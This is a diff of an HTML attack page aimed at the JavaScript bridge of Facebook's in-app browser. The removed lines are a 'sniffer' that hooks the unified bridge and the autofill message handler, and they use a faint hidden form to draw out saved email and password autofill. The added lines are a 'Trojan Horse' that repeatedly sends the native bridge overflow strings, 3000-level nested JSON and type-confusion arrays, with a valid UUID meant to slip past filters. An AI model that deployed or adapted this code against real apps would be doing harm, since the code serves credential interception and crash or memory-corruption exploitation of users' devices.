@@ -1,59 +1,61 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>JSI Sniffer</title>
-    <style>
-        body { background: #111; color: #0f0; font-family: monospace; word-wrap: break-word; font-size: 14px; }
-        .alert { color: #ff0; padding-top: 10px; border-top: 1px solid #333; margin-top: 10px; }
-    </style>
-</head>
-<body>
-    <h3>Sniffing Facebook's Internal IPC...</h3>
-    <div id="log">Waiting for Facebook to inject bridges...<br></div>
-
-    <form style="opacity: 0.1;">
-        <input type="text" name="email" autocomplete="username">
-        <input type="password" name="password" autocomplete="current-password">
-    </form>
+<head><title>JSI Trojan Horse</title></head>
+<body style="background:#000; color:#f00; font-family:monospace;">
+    <h3>Injecting Trojan Payloads...</h3>
+    <div id="log"></div>
 
     <script>
         const logEl = document.getElementById('log');
         function log(msg) { logEl.innerHTML += msg + "<br>"; }
 
-        // We use a fast interval to catch the bridge the exact moment Facebook injects it
-        let snifferInterval = setInterval(() => {
-            
-            // Hook the Unified Bridge
-            if (window.__call_iabjs_unified_bridge && !window.__call_iabjs_unified_bridge._isHooked) {
-                let realBridge = window.__call_iabjs_unified_bridge;
-                
-                window.__call_iabjs_unified_bridge = function() {
-                    let args = Array.from(arguments);
-                    log("<div class='alert'>🚨 <b>UNIFIED BRIDGE INTERCEPT:</b><br>" + JSON.stringify(args) + "</div>");
-                    return realBridge.apply(this, arguments);
-                };
-                window.__call_iabjs_unified_bridge._isHooked = true;
-                log("[+] Hooked __call_iabjs_unified_bridge!");
+        // The Weapons
+        const giantString = "A".repeat(65536); 
+        let deepJson = '{"data":';
+        for(let i=0; i<3000; i++) deepJson += '{"a":';
+        deepJson += '"pwn"';
+        for(let i=0; i<3000; i++) deepJson += '}';
+        deepJson += '}';
+
+        // A valid UUID to bypass regex filters
+        const validUUID = "90dd8846-f47b-4312-8307-3681dc5bec88";
+
+        function sendTrojan() {
+            if (typeof window.__call_iabjs_unified_bridge !== 'function') {
+                log("Waiting for bridge...");
+                return;
             }
 
-            // Hook the Autofill Message Handler
-            if (window._AutofillMessageHandler && window._AutofillMessageHandler.postMessage && !window._AutofillMessageHandler._isHooked) {
-                let realAutofill = window._AutofillMessageHandler.postMessage;
-                
-                window._AutofillMessageHandler.postMessage = function() {
-                    let args = Array.from(arguments);
-                    log("<div class='alert'>🚨 <b>AUTOFILL INTERCEPT:</b><br>" + JSON.stringify(args) + "</div>");
-                    return realAutofill.apply(this, arguments);
-                };
-                window._AutofillMessageHandler._isHooked = true;
-                log("[+] Hooked _AutofillMessageHandler!");
-            }
+            log("[*] Firing structured payloads...");
 
-        }, 10); // Check every 10ms
+            // Trojan 1: Overflow the Action Router
+            // If C++ uses a fixed buffer to read the action name, this will crush it.
+            try { window.__call_iabjs_unified_bridge(giantString, validUUID, "{}"); } catch(e){}
 
-        // Trigger a fake scroll event to wake up performance loggers
-        setTimeout(() => { window.dispatchEvent(new Event('scroll')); }, 1000);
+            // Trojan 2: Overflow the Payload Parser
+            // We use a known valid action "page_language" but give it a 64KB JSON string
+            try { 
+                let payload1 = JSON.stringify({ "message": giantString });
+                window.__call_iabjs_unified_bridge("page_language", validUUID, payload1); 
+            } catch(e){}
+
+            // Trojan 3: Stack-Buster JSON
+            // Feed the deeply nested JSON to the text_classification parser
+            try { 
+                let payload2 = JSON.stringify({ "message": deepJson });
+                window.__call_iabjs_unified_bridge("text_classification", validUUID, payload2); 
+            } catch(e){}
+
+            // Trojan 4: Type Confusion
+            // It expects a JSON object, we give it a massive Array
+            try {
+                window.__call_iabjs_unified_bridge("initializeCallbackHandler", validUUID, Array(5000).fill("A"));
+            } catch(e){}
+        }
+
+        // Fire gently to ensure they are processed sequentially by the native thread
+        setInterval(sendTrojan, 400);
+
     </script>
 </body>
 </html>
